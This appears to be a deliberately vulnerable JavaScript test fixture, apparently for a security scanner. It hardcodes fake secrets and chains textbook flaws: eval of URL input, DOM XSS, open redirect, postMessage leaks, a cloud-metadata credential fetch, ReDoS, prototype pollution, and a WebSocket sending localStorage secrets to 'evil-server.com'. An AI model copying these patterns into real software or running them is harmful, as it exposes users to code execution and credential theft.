(function() {
  "use strict";
  var SP = "sk-proj-abc123def456secret";
  var AWS_KEY = "AKIAIOSFODNN7EXAMPLE";
  var API_KEY = "AIzaSyDZTf98XxxXxXxXxXxXxXxXxXxXxXxXx-s";
  var JWT_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";

  function getParam(name) {
    var match = location.hash.match(new RegExp(name + "=([^&]*)"));
    return match ? decodeURIComponent(match[1]) : "";
  }

  function renderUser() {
    var user = getParam("user");
    document.getElementById("output").innerHTML = "Welcome, " + user;
  }

  function executeCode() {
    var code = getParam("code");
    eval(code);
  }

  function setMessage() {
    var msg = getParam("msg");
    var el = document.getElementById("msg");
    el.innerHTML = msg;
  }

  function createLink() {
    var url = getParam("url");
    var a = document.createElement("a");
    a.href = url;
    a.innerHTML = "Click me";
    document.body.appendChild(a);
  }

  function leakData() {
    var secret = localStorage.getItem("session") || "none";
    window.parent.postMessage({ secret: secret, token: JWT_TOKEN }, "*");
  }

  function dynamicRequire() {
    var mod = getParam("module");
    var script = document.createElement("script");
    script.src = "/api/modules/" + mod + ".js";
    document.head.appendChild(script);
  }

  function insecureCrypto() {
    var crypto = require("crypto");
    var hash = crypto.createHash("md5");
    hash.update("password123");
    console.log(hash.digest("hex"));
  }

  function fetchInternal() {
    fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/admin")
      .then(function(r) { return r.text(); })
      .then(function(body) { console.log(body); });
  }

  function storeSensitive() {
    localStorage.setItem("credit_card", "4111-1111-1111-1111");
    localStorage.setItem("ssn", "123-45-6789");
  }

  function vulnerableRegex() {
    var re = /^(a+)+b$/;
    return re.test(getParam("input"));
  }

  function protoPollution(obj) {
    obj["__proto__"]["polluted"] = true;
  }

  function setCookie() {
    document.cookie = "session=abc123; domain=.example.com";
  }

  function webSocketExfil() {
    var ws = new WebSocket("ws://evil-server.com/collect");
    ws.onopen = function() {
      ws.send(JSON.stringify({ data: localStorage.getItem("secret") }));
    };
  }

  function innerHtmlMany() {
    for (var i = 0; i < 5; i++) {
      document.getElementById("x" + i).innerHTML = getParam("x" + i);
    }
  }

  function domXSS() {
    var el = document.createElement("div");
    el.innerHTML = getParam("html");
    document.body.appendChild(el);
  }

  function jsUri() {
    var url = getParam("redirect");
    location.href = url;
  }

  function vulnerablePrototype() {
    var config = JSON.parse(getParam("config"));
    var opts = {};
    for (var key in config) {
      opts[key] = config[key];
    }
  }

  renderUser();
  executeCode();
  setMessage();
  createLink();
  leakData();
})();
